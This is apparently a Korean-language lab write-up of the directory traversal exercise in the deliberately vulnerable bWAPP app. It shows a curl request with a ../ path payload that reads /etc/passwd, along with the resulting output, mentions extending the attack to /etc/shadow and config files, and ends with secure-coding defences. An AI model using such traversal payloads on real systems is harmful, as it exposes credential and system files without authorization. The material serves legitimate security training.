# 웹 해킹 실습 교육: Directory Traversal - Directories / Files

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/directory_traversal_1.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-21 |

---

## 🎯 취약점 개요

### Directory Traversal (보안 디렉터리 우회/경로 탐색) 취약점이란?

웹 어플리케이션이 파일 다운로드나 텍스트 표시를 위해 사용자로부터 파일명(경로)을 입력받을 때, 상위 디렉터리로 이동하는 특수 문자열(`../` 등)을 필터링하지 않아 발생하는 취약점입니다.

공격자는 `page=message.txt` 처럼 의도된 현재 폴더의 파일 정보 대신 `page=../../../../../../../../etc/passwd` 와 같이 상위 루트 디렉터리로 계속 거슬러 올라가(Traverse) 웹 서버의 권한이 닿는 한도 내의 **모든 시스템 중요 파일, 설정 파일, 데이터베이스 암호 파일 등을 무단으로 열람**할 수 있게 됩니다. (Local File Inclusion과 흡사하지만, 실행(Include)되는 것이 아니라 열람(Read)된다는 특징이 있습니다.)

### OWASP Top 10 분류
- **A01:2021** – Broken Access Control (과거 Insecure Direct Object References (IDOR))

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약점 페이지(directory_traversal_1.php) 및 변수 분석
        (page 파라미터가 'message.txt' 라는 파일명을 받고 있음을 인지)
        │
        ▼
[2단계] 디렉터리 우회 및 시스템 중요 파일 접근 테스트
        (상위 경로 지시자 '../' 를 반복적으로 삽입하여 OS 하위 경로 도달)
        │
        ▼
[3단계] 페이로드 호출 (GET) 및 응답 획득
        (?page=../../../../../../../../etc/passwd 를 요청 파라미터로 결합하여 쏘기)
        │
        ▼
[4단계] 시스템 로컬 파일 (System Information) 완전 탈취
        (브라우저 혹은 cURL 응답 창에 찍힌 서버 내부 계정정보 추출)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 디렉터리 접근(우회) 페이로드 작성 및 서버 시스템 파일 탈취

bWAPP 서버의 파일 서비스 로직에 시스템 최상단 파일인 `/etc/passwd` 까지 우회하는 공격 문자열(Payload)을 파라미터로 부여한 후 응답을 확인합니다.

```bash
# 파일명 대신 '../../../' 로 최상단(Root)까지 우회한 뒤 시스템 파일(/etc/passwd) 열람 시도
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/directory_traversal_1.php?page=../../../../../../../../etc/passwd" | grep -i -A 10 "root:"
```

**실행 결과 및 반응:**
```text
    root:x:0:0:root:/root:/bin/bash
<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh
<br />bin:x:2:2:bin:/bin:/bin/sh
<br />sys:x:3:3:sys:/dev:/bin/sh
... (전체 계정 리스트 노출) ...
<br />bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
<br />mysql:x:112:124:MySQL Server,,,:/var/lib/mysql:/bin/false
```

> 💡 **해킹 작동 원리**: 화면 응답 코드를 분석해 볼 때, 서버 백엔드에서는 단순히 `show_file($_GET["page"]);` 함수를 이용해 넘겨받은 파라미터를 그대로 `fopen()` 또는 `file_get_contents()`에 넘깁니다. 때문에 `../` 를 따라 최상위 루트(`/`)로 이동한 애플리케이션은 대상 파일의 리눅스 계정 테이블을 통째로 읽어 브라우저에 뿌리게 됩니다.

---

## 📊 탈취(추출) 정보 요약

| 정보 유형 | 탈취된 데이터 내용 |
|-----------|------------------|
| **운영체제 시스템 정보** | 로컬 시스템 주요 설정 및 모든 사용자 계정 목록(`/etc/passwd`) |
| **추가 영향** | `/etc/shadow`, 백엔드 설정 파일(DB 자격증명이 들어있는 `settings.php` 등), Apache 또는 Nginx의 서버 access.log/error.log 까지 접근하여 연계 해킹(Log Poisoning)으로 확장 가능. |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 발생 메커니즘
해당 PHP 백엔드 앱이 "Low" 보안 등급 설정 시, 개발자가 사용자가 요청한 파일 값에 경로 우회 지시자(`../` 또는 `..\`)가 포함되어 있는지 확인 및 차단하지 않기 때문입니다. 파일 파라미터를 다루는 가장 전형적이고 심각한 코딩 실수입니다.

### 방어(Secure Coding) 가이드

1. **파일 경로 우회 문자 제거 (예방) ⭐️**
   PHP 내장 함수인 `basename()`을 거치거나, 특수 문자를 공백으로 날려버리는 방식 등을 적용해야 합니다.
   
   ```php
   // bWAPP Security Level 2 (High)의 실제 방어 구조 예시:
   // basename() 함수는 경로에 '../' 따위가 몇 개가 연결되어 있든 간에 "가장 마지막 파일명"만 뚝 떼어 반환합니다.
   $file = basename($_GET["page"]);    // "../../../../etc/passwd" 가 들어와도 "passwd"만 남음.
   show_file($file); 
   ```

2. **화이트리스트 구조화**
   사용자가 접근할 수 있는 파일 목록(`message.txt`, `log.txt` 등)을 미리 서버에 배열로 지정해 두고, 배열에 존재하는 파일명만 열람할 수 있도록 제한(`.in_array()` 활용)하는 가장 강력한 보안 설계법을 이용합니다.
   
3. **파일 접근 권한 제한 (Jail/Chroot)**
   웹 서버(앱) 프로세스가 구동될 때, 허용된 웹 루트 디렉터리 외부의 파일 시스템 영역은 접근하지 못하게 OS/서버 측면에서 파일 권한(Permission)을 단단하게 설정합니다.

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-21 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
